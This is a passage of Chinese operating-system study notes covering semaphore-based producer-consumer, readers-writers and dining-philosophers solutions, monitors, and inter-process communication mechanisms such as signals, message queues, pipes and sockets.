<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> in=<span class="number">0</span>;<span class="comment">//放入数据的地址（buffer数组的下标）</span></span><br><span class="line"><span class="keyword">int</span> out=<span class="number">0</span>;<span class="comment">//取出数据的地址</span></span><br><span class="line">item buffer[n];<span class="comment">//缓冲区，用于存放由生产者生产的数据信息</span></span><br><span class="line">semaphore mutex=<span class="number">1</span>;<span class="comment">//互斥信号量</span></span><br><span class="line">semaphore empty=n;<span class="comment">//信号量：空缓冲区的数量，初始时都是空，所以n个</span></span><br><span class="line">semaphore full=<span class="number">0</span>;<span class="comment">//信号量：满缓冲区的数量，初始时没有满的，所以0个</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//生产者</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">proceducer</span><span class="params">()</span></span>&#123;</span><br><span class="line">	  <span class="keyword">do</span>&#123;</span><br><span class="line">		    生产一个数据;</span><br><span class="line">		 	...;</span><br><span class="line">			wait(empty);<span class="comment">//申请一个缓冲区，空缓冲区减一</span></span><br><span class="line">			wait(mutex);<span class="comment">//判断有没有其他进程正在使用</span></span><br><span class="line">			</span><br><span class="line">			<span class="comment">//临界区</span></span><br><span class="line">			buffer[in]=nextp;<span class="comment">//将产品放入缓冲区</span></span><br><span class="line">			in:=(in+<span class="number">1</span>)%n;<span class="comment">//n+1</span></span><br><span class="line">			</span><br><span class="line">			signal(mutex);</span><br><span class="line">			signal(full);<span class="comment">//满缓冲区个数加一</span></span><br><span class="line">	  &#125;<span class="keyword">while</span>(TRUE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//消费者</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">consumer</span><span class="params">()</span></span>&#123;</span><br><span class="line">	  <span class="keyword">do</span>&#123;</span><br><span class="line">		  wait(full);<span class="comment">//判断是否有满缓冲区</span></span><br><span class="line">		  wait(mutex);<span class="comment">//判断是否有其他进程在使用</span></span><br><span class="line">		  </span><br><span class="line">		  <span class="comment">//临界区</span></span><br><span class="line">		  nextc=buffer[out];</span><br><span class="line">		  out=(out+<span class="number">1</span>)%n;<span class="comment">//out+1</span></span><br><span class="line">		  </span><br><span class="line">		  signal(mutex);</span><br><span class="line">		  signal(empty);</span><br><span class="line">		  </span><br><span class="line">		  剩余区消费过程;</span><br><span class="line">	  &#125;<span class="keyword">while</span>(TRUE);</span><br><span class="line">&#125;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<blockquote>
<p>每个程序中互斥的<code>wait(mutex)</code>和<code>signal(mutex)</code>必须成对出现，而<code>empty</code>和<code>full</code>的<code>P</code>，<code>V</code>操作也是成对出现，但是处于在不同的程序中。同时注意<code>P</code>操作的顺序不能颠倒,不能先执行<code>wait(mutex)</code>再执行<code>wait(empty)</code>。如果这么做了，那么可能会出现这种情况：生产者对缓冲区加锁后，执行<code>wait(empty)</code>操作，发现<code>empty = 0</code>，此时生产者睡眠。消费者不能进入临界区，因为生产者对缓冲区加锁了，消费者就无法执行<code>singnal(empty)</code>操作，<code>empty</code>永远都为 0，导致生产者永远等待下，不会释放锁，消费者因此也会永远等待下去。</p>
</blockquote>
<h1 id="8-管程"><a href="#8-管程" class="headerlink" title="8. 管程"></a>8. 管程</h1><p>代表共享资源的数据结构以及由对该共享数据结构实施操作的一组过程所组成的资源管理程序共同构成了一个操作系统的资源管理模块称为管程。</p>
<p>使用信号量机制实现的生产者消费者问题需要客户端代码做很多控制，而管程把控制的代码独立出来，不仅不容易出错，也使得客户端代码调用更容易。</p>
<p>管程有一个重要特性：在一个时刻只能有一个进程使用管程。进程在无法继续执行的时候不能一直占用管程，否则其它进程永远不能使用管程。</p>
<p>管程引入了条件变量以及相关的操作:<code>wait()</code>和<code>signal()</code>来实现同步操作。对条件变量执行<code>wait()</code>操作会导致调用进程阻塞，把管程让出来给另一个进程持有。<code>signal()</code>操作用于唤醒被阻塞的进程。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">monitor ProducerConsumer</span><br><span class="line">    condition full, empty;</span><br><span class="line">    integer count := <span class="number">0</span>;</span><br><span class="line">    condition c;</span><br><span class="line"></span><br><span class="line">    procedure insert(item: integer);</span><br><span class="line">    begin</span><br><span class="line">        <span class="keyword">if</span> count = N then wait(full);</span><br><span class="line">        insert_item(item);</span><br><span class="line">        count := count + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> count = <span class="number">1</span> then signal(empty);</span><br><span class="line">    end;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">remove</span>: <span class="title">integer</span></span>;</span><br><span class="line">    begin</span><br><span class="line">        <span class="keyword">if</span> count = <span class="number">0</span> then wait(empty);</span><br><span class="line">        remove = remove_item;</span><br><span class="line">        count := count - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> count = N -<span class="number">1</span> then signal(full);</span><br><span class="line">    end;</span><br><span class="line">end monitor;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生产者客户端</span></span><br><span class="line">procedure producer</span><br><span class="line">begin</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></span><br><span class="line">    begin</span><br><span class="line">        item = produce_item;</span><br><span class="line">        ProducerConsumer.insert(item);</span><br><span class="line">    end</span><br><span class="line">end;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消费者客户端</span></span><br><span class="line">procedure consumer</span><br><span class="line">begin</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></span><br><span class="line">    begin</span><br><span class="line">        item = ProducerConsumer.remove;</span><br><span class="line">        consume_item(item);</span><br><span class="line">    end</span><br><span class="line">end;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<h1 id="9-经典同步问题"><a href="#9-经典同步问题" class="headerlink" title="9. 经典同步问题"></a>9. 经典同步问题</h1><h2 id="读者——写者问题"><a href="#读者——写者问题" class="headerlink" title="读者——写者问题"></a>读者——写者问题</h2><p>一个数据文件或记录，可被多个进程共享，我们把只要求读该文件的进程称为<code>Reader</code>进程，其他进程则称为<code>Writer</code>进程。允许多个进程同时读一个共享对象，因为读操作不会使数据文件混乱。但不允许一个<code>Writer</code>进程和其他<code>Reader</code>进程或<code>Writer</code>进程同时访问共享对象，因为这种访问将会引起混乱。所谓“读者—写者问题(Reader-Writer Problem)”是指保证一个<code>Writer</code>进程必须与其他进程互斥地访问共享对象的同步问题。读者—写者问题常被用来测试新同步原语。<strong>共享对象不是临界资源</strong></p>
<p>为实现 Reader 与 Writer 进程间在读或写时的互斥而设置了一个互斥信号量 <code>Wmutex</code>，再设置一个整型变量<code>Readcount</code>表示正在读的进程数目。<code>Readcount</code>是一个可被多个Reader进程访问的<strong>临界资源</strong>，因此，也应该为它设置一个互斥信号量<code>rmutex</code>。<br>仅当<code>Readcount=0</code>，表示尚无<code>Reader</code>进程在读时，<code>Reader</code>进程才需要执行<code>Wait(Wmutex)</code>操作。若<code>Wait(Wmutex)</code>操作成功,<code>Reader</code>进程便可去读，相应地，做<code>Readcount+1</code>操作。同理，仅当<code>Reader</code>进程在执行了<code>Readcount</code>减 1 操作后其值为 0 时，才须执行<code>signal(Wmutex)</code>操作，以便让<code>Writer</code>进程写。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sempaphore rmutex=<span class="number">1</span>,wmutex=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> readcount=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reader</span><span class="params">()</span></span>&#123;</span><br><span class="line">	  <span class="keyword">do</span>&#123;</span><br><span class="line">	  	  wait(rmutex);</span><br><span class="line">		  <span class="keyword">if</span>(readcount==<span class="number">0</span>) wait(wmutex);</span><br><span class="line">		  readcount++;</span><br><span class="line">		  signal(rmutex);</span><br><span class="line">		  ...</span><br><span class="line">		  wait(rmutex);</span><br><span class="line">		  readcount--;</span><br><span class="line">		  <span class="keyword">if</span>(readcount==<span class="number">0</span>) signal(wmutex);</span><br><span class="line">		  signal(rmutex);</span><br><span class="line">	  &#125;<span class="keyword">while</span>(TRUE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writer</span><span class="params">()</span></span>&#123;</span><br><span class="line">	  <span class="keyword">do</span>&#123;</span><br><span class="line">	  	  wait(wmutex);</span><br><span class="line">		  ...</span><br><span class="line">		  signal(wmutex);</span><br><span class="line">	  &#125;<span class="keyword">while</span>(TRUE);</span><br><span class="line">&#125;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<h2 id="哲学家进餐问题"><a href="#哲学家进餐问题" class="headerlink" title="哲学家进餐问题"></a>哲学家进餐问题</h2><p>该问题是描述有五个哲学家共用一张圆桌，分别坐在周围的五张椅子上，在圆桌上有五个碗和五只筷子，他们的生活方式是交替地进行思考和进餐。平时，一个哲学家进行思考，饥饿时便试图取用其左右最靠近他的筷子，只有在他拿到两只筷子时才能进餐。 进餐完毕，放下筷子继续思考。</p>
<p>放在桌子上的筷子是临界资源，在一段时间内只允许一位哲学家使用。为了实现对筷子的互斥使用，可以用一个信号量表示一只筷子，由这五个信号量构成信号量数组，所有信号量均被初始化为1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">semaphore chopstick[<span class="number">5</span>]=&#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第i位哲学家的活动</span></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">	  wait(chopstick[i]);<span class="comment">//先拿起左边的筷子</span></span><br><span class="line">	  wait(chopstick[(i+<span class="number">1</span>)%<span class="number">5</span>]);<span class="comment">//再拿右边的筷子</span></span><br><span class="line">	  ...</span><br><span class="line">	  <span class="comment">//eat</span></span><br><span class="line">	  ...</span><br><span class="line">	  signal(chopstick[i]);</span><br><span class="line">	  signal(chopstick[(i+<span class="number">1</span>)%<span class="number">5</span>]);</span><br><span class="line">	  ...</span><br><span class="line">	  <span class="comment">//think</span></span><br><span class="line">	  ...</span><br><span class="line">&#125;<span class="keyword">while</span>[TRUE];</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>上面的代码存在死锁的情况：假如五位哲学家同时饥饿而各自拿起左边的筷子时，就会使五个信号量<code>chopstick</code>均为 0,当他们再试图去拿右边的筷子时，都将因无筷子可拿而无限期地等待。解决方法有：</p>
<ol>
<li>至多只允许有四位哲学家同时去拿左边的筷子，最终能保证至少有一位哲学家能够进餐，并在用毕时能释放出他用过的两只筷子，从而使更多的哲学家能够进餐。</li>
<li>仅当哲学家的左、右两只筷子均可用时，才允许他拿起筷子进餐。</li>
<li>规定奇数号哲学家先拿他左边的筷子，然后再去拿右边的筷子，而偶数号哲学家则相反。按此规定，将是 1、2 号哲学家竞争 1 号筷子；3、4 号哲学家竞争 3 号筷子。即五位哲学家都先竞争奇数号筷子，获得后，再去竞争偶数号筷子，最后总会有一位哲学家能获得两只筷子而进餐。</li>
</ol>
<p>利用AND型信号量解决哲学家进餐问题</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">semaphore chopstick[<span class="number">5</span>]=&#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">	  ...;</span><br><span class="line">	  <span class="comment">//think;</span></span><br><span class="line">	  ...</span><br><span class="line">	  Sswait(chopstick[(i+<span class="number">1</span>)%<span class="number">5</span>],chopstick[i]);</span><br><span class="line">	  ...</span><br><span class="line">	  <span class="comment">//eat</span></span><br><span class="line">	  ...</span><br><span class="line">	  Ssignal(chopstick[(i+<span class="number">1</span>)%<span class="number">5</span>],chopstick[i]);</span><br><span class="line">&#125;<span class="keyword">while</span>[TRUE];</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<h1 id="10-进程通信"><a href="#10-进程通信" class="headerlink" title="10. 进程通信"></a>10. 进程通信</h1><p>每个进程各自有不同的用户地址空间，任何一个进程的全局变量在另一个进程中都看不到，所以进程之间要交换数据必须通过内核，在内核中开辟一块缓冲区，进程1把数据从用户空间拷到内核缓冲区，进程2再从内核缓冲区把数据读走，内核提供的这种机制称为<strong>进程间通信</strong>（IPC，InterProcess Communication)</p>
<p><a href="http://qiniu.xiaoming.net.cn/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%A8%A1%E5%9E%8B.webp"><img src="http://qiniu.xiaoming.net.cn/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%A8%A1%E5%9E%8B.webp" alt="进程间通信模型"></a></p>
<p>进程同步与进程通信很容易混淆，它们的区别在于：</p>
<ul>
<li>进程同步：控制多个进程按一定顺序执行；</li>
<li>进程通信：进程间传输信息。</li>
</ul>
<p>进程通信是一种手段，而进程同步是一种目的。也可以说，为了能够达到进程同步的目的，需要让进程进行通信，传输一些进程同步所需要的信息。</p>
<p>进程通信是指进程之间的信息交换。根据进程交换信息量的多少，可以分为低级通信和高级通信。</p>
<ul>
<li>低级通信：进程的互斥和同步</li>
<li>高级通信：指用户可直接利用OS提供的一组通信命令，高效地传送大量数据的一种通信方式，对用户透明。</li>
</ul>
<h2 id="进程通信的分类"><a href="#进程通信的分类" class="headerlink" title="进程通信的分类"></a>进程通信的分类</h2><ul>
<li>共享存储器系统</li>
<li>管道通信系统</li>
<li>消息传递系统</li>
<li>客户机-服务器系统</li>
</ul>
<h3 id="共享存储器系统"><a href="#共享存储器系统" class="headerlink" title="共享存储器系统"></a>共享存储器系统</h3><p>相互通信的进程共享某些数据结构或共享存储区，进程之间能够通过这些空间进行通信。</p>
<ul>
<li>共享数据结构的通信方式：进程之间通过某种数据结构，如缓冲池进行通信，这种方式仅适用于传递相对少量的数据，通信效率低下，属于低级通信方式。</li>
<li>共享存储区通信方式：为了传递大量信息，在存储器中划出一块共享存储区，进程可通过对共享存储区进行读或写来实现通信，属于高级通信方式。</li>
</ul>
<h4 id="共享内存-share-memory"><a href="#共享内存-share-memory" class="headerlink" title="共享内存(share memory)"></a>共享内存(share memory)</h4><p>使得多个进程可以可以直接读写同一块内存空间，是最快的形式。是针对其他通信机制运行效率较低而设计的。</p>
<p>为了在多个进程间交换信息，内核专门留出了一块内存区，可以由需要访问的进程将其映射到自己的私有地址空间。进程就可以直接读写这一块内存而不需要进行数据的拷贝，从而大大提高效率。</p>
<p>由于多个进程共享一段内存，因此需要依靠某种同步机制（如信号量）来达到进程间的同步及互斥。</p>
<p><a href="http://qiniu.xiaoming.net.cn/%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98%E5%8E%9F%E7%90%86%E5%9B%BE.webp"><img src="http://qiniu.xiaoming.net.cn/%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98%E5%8E%9F%E7%90%86%E5%9B%BE.webp" alt="共享内存原理"></a></p>
<h3 id="消息传递系统"><a href="#消息传递系统" class="headerlink" title="消息传递系统"></a>消息传递系统</h3><p>进程间的数据交换以格式化的消息(message)为单位，将通信的数据封装在消息中，并利用操作系统提供的一组通信命令（原语），在进程间进行消息传递；在计算机网络中， 又把 message 称为报文。属于高级通信方式，根据实现方式不同，可分为以下两种：</p>
<h4 id="直接通信方式"><a href="#直接通信方式" class="headerlink" title="直接通信方式"></a>直接通信方式</h4><p>发送进程利用OS所提供的发送原语（<code>Send</code>,<code>Receive</code>)(如 Linux 系统中的信号（signal）),直接把消息发送给目标进程。发送进程和接收进程都以显式方式分别提供对方的标识符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Send(Receiver,message);</span><br><span class="line">Receive(Sender,message);</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p><strong>信号（signal）</strong><br>信号是 Linux 系统中用于进程间互相通信或者操作的一种机制，信号可以在任何时候发给某一进程，而无需知道该进程的状态。</p>
<p>如果该进程当前并未处于执行状态，则该信号就由内核保存起来，直到该进程回复执行并传递给它为止。<br>如果一个信号被进程设置为阻塞，则该信号的传递被延迟，直到其阻塞被取消是才被传递给进程。</p>
<p>Linux系统中常用信号：</p>
<ul>
<li>SIGHUP：用户从终端注销，所有已启动进程都将收到该进程。系统缺省状态下对该信号的处理是终止进程。</li>
<li>SIGINT：程序终止信号。程序运行过程中，按Ctrl+C键将产生该信号。</li>
<li>SIGQUIT：程序退出信号。程序运行过程中，按Ctrl+\键将产生该信号。</li>
<li>SIGBUS和SIGSEGV：进程访问非法地址。</li>
<li>SIGFPE：运算中出现致命错误，如除零操作、数据溢出等。</li>
<li>SIGKILL：用户终止进程执行信号。shell下执行kill -9发送该信号。</li>
<li>SIGTERM：结束进程信号。shell下执行kill 进程pid发送该信号。</li>
<li>SIGALRM：定时器信号。</li>
<li>SIGCLD：子进程退出信号。如果其父进程没有忽略该信号也没有处理该信号，则子进程退出后将形成僵尸进程。</li>
</ul>
<p><strong>信号来源</strong></p>
<p>信号是软件层次上对中断机制的一种模拟，是一种异步通信方式，信号可以在用户空间进程和内核之间直接交互，内核可以利用信号来通知用户空间的进程发生了哪些系统事件，信号事件主要有两个来源：</p>
<ul>
<li>硬件来源：用户按键输入Ctrl+C退出、硬件异常如无效的存储访问等。</li>
<li>软件终止：终止进程信号、其他进程调用kill函数、软件异常产生信号。</li>
</ul>
<p><strong>信号生命周期和处理流程</strong></p>
<ol>
<li>信号被某个进程产生，并设置此信号传递的对象（一般为对应进程的pid），然后传递给操作系统；</li>
<li>操作系统根据接收进程的设置（是否阻塞）而选择性的发送给接收者，如果接收者阻塞该信号（且该信号是可以阻塞的），操作系统将暂时保留该信号，而不传递，直到该进程解除了对此信号的阻塞（如果对应进程已经退出，则丢弃此信号），如果对应进程没有阻塞，操作系统将传递此信号。</li>
<li>目的进程接收到此信号后，将根据当前进程对此信号设置的预处理方式，暂时终止当前代码的执行，保护上下文（主要包括临时寄存器数据，当前程序位置以及当前CPU的状态）、转而执行中断服务程序，执行完成后在回复到中断的位置。当然，对于抢占式内核，在中断返回时还将引发新的调度。</li>
</ol>
<p><a href="http://qiniu.xiaoming.net.cn/%E4%BF%A1%E5%8F%B7%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.webp"><img src="http://qiniu.xiaoming.net.cn/%E4%BF%A1%E5%8F%B7%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.webp" alt="信号的生命周期"></a></p>
<h4 id="间接通信方式"><a href="#间接通信方式" class="headerlink" title="间接通信方式"></a>间接通信方式</h4><p>进程之间的通信需要通过某种中间实体（称为邮箱），也就是消息队列，该实体用来暂存发送进程发送给目标进程的消息；接收进程从该实体中取出对方发送给自己的消息。这种方式可以实现非实时通信。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Send(mailbox,message);</span><br><span class="line">Receive(mailbox,message);</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>消息队列是存放在内核中的消息链表，每个消息队列由消息队列标识符表示。</p>
<p>与管道（无名管道：只存在于内存中的文件；命名管道：存在于实际的磁盘介质或者文件系统）不同的是消息队列存放在内核中，只有在内核重启(即，操作系统重启)或者显示地删除一个消息队列时，该消息队列才会被真正的删除。</p>
<p>另外与管道不同的是，消息队列在某个进程往一个队列写入消息之前，并不需要另外某个进程在该队列上等待消息的到达。</p>
<p>消息队列特点总结：</p>
<ol>
<li>消息队列是消息的链表,具有特定的格式,存放在内存中并由消息队列标识符标识.</li>
<li>消息队列允许一个或多个进程向它写入与读取消息.</li>
<li>管道和消息队列的通信数据都是先进先出的原则。</li>
<li>消息队列可以实现消息的随机查询,消息不一定要以先进先出的次序读取,也可以按消息的类型读取。比FIFO更有优势。</li>
<li>消息队列克服了信号承载信息量少，管道只能承载无格式字节流以及缓冲区大小受限等缺点。</li>
<li>目前主要有两种类型的消息队列：POSIX消息队列以及System V消息队列，系统V消息队列目前被大量使用。系统V消息队列是随内核持续的，只有在内核重起或者人工删除时，该消息队列才会被删除。</li>
</ol>
<p>根据邮箱的属性权限，可以分为私用邮箱，公用邮箱和共享邮箱。</p>
<ul>
<li><strong>私用邮箱</strong>:用户进程建立，作为该进程的一部分，拥有者有权读消息，其他用户只能发送。采用单向通信链路，进程结束时邮箱也消失。</li>
<li><strong>公用邮箱</strong>:由OS创建，提供给系统中的所有核进程使用，进程既可以发送，也可以取出，采用双向通信链路的邮箱来实现，系统运行期间始终存在。</li>
<li><strong>共享邮箱</strong>：由某进程创建，创建时提供共享进程（用户）的名字。邮箱的拥有者和共享者，都有权从邮箱中取走发送给自己的消息。</li>
</ul>
<p><strong>邮箱通信时发送进程和接收进程的关系</strong>：</p>
<ul>
<li><code>一对一关系</code>:建立一条专用的通信链路</li>
<li><code>多对一关系</code>:服务进程与多个用户进程之间进行交互，又称客户/服务器交互。</li>
<li><code>一对多关系</code>:一个发送进程与多个进程进程交互，使发送进程可用广播形式，向接收者发送消息。</li>
<li><code>多对多关系</code>：建立一个公用邮箱，多个进程投递并取走自己的消息。</li>
</ul>
<h3 id="管道通信系统（匿名管道）"><a href="#管道通信系统（匿名管道）" class="headerlink" title="管道通信系统（匿名管道）"></a>管道通信系统（匿名管道）</h3><p>管道通信方式建立在文件系统的基础上，利用共享文件来连接两个相互通信的进程，此共享文件称为管道（Pipe）。向管道(共享文件)提供输入的发送进程(即写进程)，以字符流形式将大量的数据送入管道；而接受管道输出的接收进程(即读进程)，则从管道中接收(读)数据。</p>
<p>管道通信必须的协调能力：</p>
<ul>
<li>互斥，即当一个进程正在对 pipe 执行读/写操作时，其它(另一)进程必须等待。</li>
<li>同步，指当写(输入)进程把一定数量(如 4 KB)的数据写入 pipe，便去睡眠等待，直到读(输出)进程取走数据后，再把它唤醒。当读进程读一空 pipe 时，也应睡眠等待，直至写进程将数据写入管道后，才将之唤醒。</li>
<li>确定对方是否存在，只有确定了对方已存在时，才能进行通信。</li>
</ul>
<p>管道是通过调用<code>pipe</code>函数创建的，<code>fd[0]</code>用于读，<code>fd[1]</code>用于写。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">int pipe(int fd[2]);</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>它具有以下特点：</p>
<ul>
<li>只支持半双工通信，数据只能向一个方向流动；需要双方通信时，需要建立起两个管道。（单向交替传输）；</li>
<li><strong>只能用于父子进程或者兄弟进程之间(具有亲缘关系的进程)</strong>;</li>
<li>单独构成一种独立的文件系统：管道对于管道两端的进程而言，就是一个文件，但它不是普通的文件，它不属于某种文件系统，而是自立门户，单独构成一种文件系统，并且只存在与内存中。</li>
<li>数据的读出和写入：一个进程向管道中写的内容被管道另一端的进程读出。写入的内容每次都添加在管道缓冲区的末尾，并且每次都是从缓冲区的头部读出数据。</li>
</ul>
<p><a href="http://qiniu.xiaoming.net.cn/%E8%BF%9B%E7%A8%8B%E9%97%B4%E7%AE%A1%E9%81%93%E9%80%9A%E4%BF%A1%E7%9A%84%E6%A8%A1%E5%9E%8B.webp"><img src="http://qiniu.xiaoming.net.cn/%E8%BF%9B%E7%A8%8B%E9%97%B4%E7%AE%A1%E9%81%93%E9%80%9A%E4%BF%A1%E7%9A%84%E6%A8%A1%E5%9E%8B.webp" alt="进程间管道通信的模型"></a></p>
<h4 id="管道的实质："><a href="#管道的实质：" class="headerlink" title="管道的实质："></a>管道的实质：</h4><p>管道的实质是一个内核缓冲区，进程以先进先出的方式从缓冲区存取数据，管道一端的进程顺序的将数据写入缓冲区，另一端的进程则顺序的读出数据。</p>
<p>该缓冲区可以看做是一个循环队列，读和写的位置都是自动增长的，不能随意改变，一个数据只能被读一次，读出来以后在缓冲区就不复存在了。</p>
<p>当缓冲区读空或者写满时，有一定的规则控制相应的读进程或者写进程进入等待队列，当空的缓冲区有新数据写入或者满的缓冲区有数据读出来时，就唤醒等待队列中的进程继续读写。</p>
<h4 id="管道的局限："><a href="#管道的局限：" class="headerlink" title="管道的局限："></a>管道的局限：</h4><p>管道的主要局限性正体现在它的特点上：</p>
<ul>
<li>只支持单向数据流；</li>
<li>只能用于具有亲缘关系的进程之间；</li>
<li>没有名字；</li>
<li>管道的缓冲区是有限的（管道制存在于内存中，在管道创建时，为缓冲区分配一个页面大小）；</li>
<li>管道所传送的是无格式字节流，这就要求管道的读出方和写入方必须事先约定好数据的格式，比如多少字节算作一个消息（或命令、或记录）等等；</li>
</ul>
<h3 id="有名管道-FIFO"><a href="#有名管道-FIFO" class="headerlink" title="有名管道(FIFO)"></a>有名管道(FIFO)</h3><p>匿名管道，由于没有名字，只能用于亲缘关系的进程间通信。为了克服这个缺点，提出了有名管道(Names Pipes)。</p>
<p>有名管道不同于匿名管道之处在于它提供了一个路径名与之关联，以有名管道的文件形式存在于文件系统中，这样，即使与有名管道的创建进程不存在亲缘关系的进程，只要可以访问该路径，就能够彼此通过有名管道相互通信，因此，通过有名管道不相关的进程也能交换数据。值的注意的是，有名管道严格遵循先进先出(first in first out),对匿名管道及有名管道的读总是从开始处返回数据，对它们的写则把数据添加到末尾。有名管道的名字存在于文件系统中，内容存放在内存中。</p>
<h4 id="匿名管道和有名管道对比："><a href="#匿名管道和有名管道对比：" class="headerlink" title="匿名管道和有名管道对比："></a>匿名管道和有名管道对比：</h4><ol>
<li>管道是特殊类型的文件，在满足先入先出的原则条件下可以进行读写，但不能进行定位读写。</li>
<li>匿名管道是单向的，只能在有亲缘关系的进程间通信；有名管道以磁盘文件的方式存在，可以实现本机任意两个进程通信。</li>
<li>无名管道阻塞问题：无名管道无需显示打开，创建时直接返回文件描述符，在读写时需要确定对方的存在，否则将退出。如果当前进程向无名管道的一端写数据，必须确定另一端有某一进程。如果写入无名管道的数据超过其最大值，写操作将阻塞，如果管道中没有数据，读操作将阻塞，如果管道发现另一端断开，将自动退出。</li>
<li>有名管道阻塞问题：有名管道在打开时需要确实对方的存在，否则将阻塞。即以读方式打开某管道，在此之前必须一个进程以写方式打开管道，否则阻塞。此外，可以以读写（O_RDWR）模式打开有名管道，即当前进程读，当前进程写，不会阻塞。</li>
</ol>
<h3 id="客户机——服务器系统（套接字-socket-）"><a href="#客户机——服务器系统（套接字-socket-）" class="headerlink" title="客户机——服务器系统（套接字(socket)）"></a>客户机——服务器系统（套接字(socket)）</h3><p>套接字是一种通信机制，凭借这种机制，客户/服务器（即要进行通信的进程）系统的开发工作既可以在本地单机上进行，也可以跨网络进行。也就是说它可以让不在同一台计算机但通过网络连接计算机上的进程进行通信。</p>
<p><a href="http://qiniu.xiaoming.net.cn/Socket%E2%80%94%E2%80%94%E5%BA%94%E7%94%A8%E5%B1%82%E5%92%8C%E4%BC%A0%E8%BE%93%E5%B1%82%E4%B9%8B%E9%97%B4%E7%9A%84%E6%A1%A5%E6%A2%81.webp"><img src="http://qiniu.xiaoming.net.cn/Socket%E2%80%94%E2%80%94%E5%BA%94%E7%94%A8%E5%B1%82%E5%92%8C%E4%BC%A0%E8%BE%93%E5%B1%82%E4%B9%8B%E9%97%B4%E7%9A%84%E6%A1%A5%E6%A2%81.webp" alt="Socket——应用层和传输层之间的桥梁"></a></p>
<p>套接字是支持 TCP/IP 的网络通信的基本操作单元，可以看做是不同主机之间的进程进行双向通信的端点，简单的说就是通信的两方的一种约定，用套接字中的相关函数来完成通信过程。</p>
<h4 id="套接字特性"><a href="#套接字特性" class="headerlink" title="套接字特性"></a>套接字特性</h4><p>套接字的特性由3个属性确定，它们分别是：域、端口号、协议类型。</p>
<p><strong>1. 套接字的域</strong></p>
<p>它指定套接字通信中使用的网络介质，最常见的套接字域有两种：</p>
<p>一是 <code>AF_INET</code>，它指的是 Internet 网络。当客户使用套接字进行跨网络的连接时，它就需要用到服务器计算机的 IP 地址和端口来指定一台联网机器上的某个特定服务，所以在使用 socket 作为通信的终点，服务器应用程序必须在开始通信之前绑定一个端口，服务器在指定的端口等待客户的连接。</p>
<p>另一个域 <code>AF_UNIX</code>，表示 UNIX 文件系统，它就是文件输入/输出，而它的地址就是文件名。</p>
<p><strong>2. 套接字的端口号</strong></p>
<p>每一个基于 TCP/IP 网络通讯的程序(进程)都被赋予了唯一的端口和端口号，端口是一个信息缓冲区，用于保留 Socket 中的输入/输出信息，端口号是一个 16 位无符号整数，范围是 0-65535，以区别主机上的每一个程序（端口号就像房屋中的房间号），低于 256 的端口号保留给标准应用程序，比如 pop3 的端口号就是110，每一个套接字都组合进了IP地址、端口，这样形成的整体就可以区别每一个套接字。</p>
<p><strong>3. 套接字协议类型</strong></p>
<p>因特网提供三种通信机制:</p>
<p>一是<strong>流套接字</strong>，流套接字在域中通过 TCP/IP 连接实现，同时也是 <code>AF_UNIX</code> 中常用的套接字类型。流套接字提供的是一个有序、可靠、双向字节流的连接，因此发送的数据可以确保不会丢失、重复或乱序到达，而且它还有一定的出错后重新发送的机制。</p>
<p>二是<strong>数据报套接字</strong>，它不需要建立连接和维持一个连接，它们在域中通常是通过 <code>UDP/IP</code> 协议实现的。它对可以发送的数据的长度有限制，数据报作为一个单独的网络消息被传输,它可能会丢失、复制或错乱到达，UDP 不是一个可靠的协议，但是它的速度比较高，因为它并一需要总是要建立和维持一个连接。</p>
